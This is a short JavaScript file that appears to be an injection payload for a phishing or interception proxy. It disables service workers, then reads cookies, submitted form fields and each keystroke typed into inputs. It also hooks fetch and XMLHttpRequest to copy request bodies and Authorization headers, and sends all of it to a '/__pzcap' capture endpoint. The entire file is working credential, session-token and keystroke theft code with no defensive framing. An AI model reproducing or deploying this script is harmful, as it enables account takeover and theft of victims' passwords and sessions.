(function(){
'use strict';
var _E='/__pzcap';
function send(o){try{navigator.sendBeacon(_E,JSON.stringify(o));}catch(err){
  try{var x=new XMLHttpRequest();x.open('POST',_E,true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(o));}catch(e2){}
}}

// 0. Kill service workers — unregister existing ones, block new registrations
if('serviceWorker' in navigator){
  try{
    navigator.serviceWorker.getRegistrations().then(function(regs){
      regs.forEach(function(r){r.unregister();});
    });
  }catch(e){}
  navigator.serviceWorker.register=function(){
    return Promise.reject(new Error('pz-blocked'));
  };
}

// 1. Snapshot cookies immediately + on every page show
function snapCookies(){send({type:'cookies',url:location.href,cookies:document.cookie});}
snapCookies();
document.addEventListener('visibilitychange',function(){if(!document.hidden)snapCookies();});

// 2. Capture form submits (fires before the request is sent)
document.addEventListener('submit',function(e){
  var d={type:'form',url:location.href,method:(e.target.method||'GET').toUpperCase(),fields:{}};
  for(var i=0;i<e.target.elements.length;i++){
    var el=e.target.elements[i];
    if(el.name&&el.type!=='submit'&&el.type!=='button'&&el.type!=='hidden')
      d.fields[el.name]=el.value;
  }
  send(d);
},true);

// 3. Per-field keystroke capture (attaches on first focus)
document.addEventListener('focusin',function(e){
  var el=e.target;
  if((el.tagName!=='INPUT'&&el.tagName!=='TEXTAREA')||el.__pzT)return;
  el.__pzT=1;
  el.addEventListener('input',function(){
    send({type:'keystroke',url:location.href,
      field:el.name||el.id||el.getAttribute('placeholder')||el.type||'?',
      value:el.value});
  });
},true);

// 4. Patch window.fetch — capture method, headers, body
var _oFetch=window.fetch;
window.fetch=function(url,opts){
  try{
    var method=(opts&&opts.method)||'GET';
    var hdrs={};
    if(opts&&opts.headers){
      try{
        if(opts.headers instanceof Headers){opts.headers.forEach(function(v,k){hdrs[k]=v;});}
        else{hdrs=Object.assign({},opts.headers);}
      }catch(e){}
    }
    var body=null;
    if(opts&&opts.body){
      if(opts.body instanceof FormData){var o={};opts.body.forEach(function(v,k){o[k]=v;});body=JSON.stringify(o);}
      else{try{body=String(opts.body);}catch(e){}}
    }
    var hasInterest=body||hdrs['Authorization']||hdrs['authorization']||method.toUpperCase()!=='GET';
    if(hasInterest)send({type:'fetch',url:String(url),method:method,headers:hdrs,body:body});
  }catch(e){}
  return _oFetch.apply(this,arguments);
};

// 5. Patch XMLHttpRequest — capture method, headers, body
var _oOpen=XMLHttpRequest.prototype.open,_oSend=XMLHttpRequest.prototype.send,_oSetHdr=XMLHttpRequest.prototype.setRequestHeader;
XMLHttpRequest.prototype.open=function(m,u){this.__pzM=m;this.__pzU=u;this.__pzH={};_oOpen.apply(this,arguments);};
XMLHttpRequest.prototype.setRequestHeader=function(h,v){
  try{if(this.__pzH)this.__pzH[h]=v;}catch(e){}
  _oSetHdr.apply(this,arguments);
};
XMLHttpRequest.prototype.send=function(body){
  try{
    var hasAuth=this.__pzH&&(this.__pzH['Authorization']||this.__pzH['authorization']);
    var hasBody=body&&this.__pzM&&this.__pzM.toUpperCase()!=='GET';
    if(hasAuth||hasBody)
      send({type:'xhr',url:String(this.__pzU),method:this.__pzM,headers:this.__pzH||{},body:body?String(body):null});
  }catch(e){}
  _oSend.apply(this,arguments);
};

// 6. Capture SPA navigation (history.pushState / replaceState)
try{
  var _oPush=history.pushState.bind(history);
  var _oReplace=history.replaceState.bind(history);
  history.pushState=function(state,title,url){
    if(url)send({type:'navigate',url:String(url)});
    return _oPush(state,title,url);
  };
  history.replaceState=function(state,title,url){
    return _oReplace(state,title,url);
  };
}catch(e){}
})();
